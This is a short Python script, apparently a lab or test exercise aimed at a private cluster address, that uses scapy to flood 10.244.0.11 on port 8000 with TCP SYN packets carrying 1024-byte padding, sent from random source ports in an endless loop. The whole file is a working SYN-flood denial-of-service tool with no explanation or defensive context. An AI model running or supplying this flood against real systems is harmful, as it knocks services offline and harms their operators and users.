from scapy.all import *

target_ip = "10.244.0.11"
target_port = 8000

ip = IP(dst = target_ip)
tcp = TCP(sport = RandShort(), dport = target_port, flags = "S")

raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop = 1, verbose = 0)